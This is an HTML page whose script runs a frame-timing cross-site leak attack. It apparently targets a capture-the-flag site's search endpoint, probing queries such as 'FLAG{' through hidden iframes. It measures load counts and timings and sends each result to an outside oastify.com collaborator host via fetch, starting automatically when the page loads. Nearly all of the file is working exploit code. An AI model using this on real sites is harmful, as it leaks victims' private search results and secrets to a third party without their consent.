<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Frame Timing XS-Leak</title>
</head>
<body>
    <h1>Frame Timing Attack...</h1>
    <pre id="log"></pre>

    <script>
        const log = document.getElementById('log');
        const TARGET_URL = "https://wonder.cbd2026.cloud";
        const LEAK_URL = "https://k6r9iy8qi6vi356vyqym37ebh2ntbvzk.oastify.com";

        function logMsg(msg) {
            log.textContent += msg + "\n";
        }

        // Frame timing: Load page in iframe and measure load events
        async function frameTimingAttack(query) {
            const url = `${TARGET_URL}/search?q=${encodeURIComponent(query)}`;
            
            return new Promise((resolve) => {
                const iframe = document.createElement('iframe');
                let loadCount = 0;
                const startTime = performance.now();
                
                iframe.onload = () => {
                    loadCount++;
                    const duration = performance.now() - startTime;
                    
                    logMsg(`Query: "${query}"`);
                    logMsg(`  - Load count: ${loadCount}`);
                    logMsg(`  - Duration: ${duration}ms`);
                    
                    // Send result
                    fetch(`${LEAK_URL}?f=FRAME:${encodeURIComponent(query)}:loads=${loadCount}:time=${duration}`)
                        .catch(e => {});
                    
                    setTimeout(() => {
                        document.body.removeChild(iframe);
                        resolve({ loadCount, duration });
                    }, 1000);
                };
                
                iframe.onerror = () => {
                    logMsg(`Error loading: "${query}"`);
                    fetch(`${LEAK_URL}?f=FRAME:${encodeURIComponent(query)}:error`)
                        .catch(e => {});
                    resolve({ loadCount: 0, duration: 0 });
                };
                
                iframe.style.display = 'none';
                iframe.src = url;
                document.body.appendChild(iframe);
                
                // Timeout
                setTimeout(() => {
                    if (loadCount === 0) {
                        logMsg(`Timeout: "${query}"`);
                        fetch(`${LEAK_URL}?f=FRAME:${encodeURIComponent(query)}:timeout`)
                            .catch(e => {});
                        resolve({ loadCount: 0, duration: 0 });
                    }
                }, 5000);
            });
        }

        async function testQueries() {
            const queries = ["CBD{", "FLAG{", "test", "xyz", "admin"];
            
            logMsg("Starting frame timing attack...");
            
            for (const query of queries) {
                await frameTimingAttack(query);
                await new Promise(r => setTimeout(r, 1000));
            }
            
            logMsg("Tests completed!");
        }

        testQueries();
    </script>
</body>
</html>
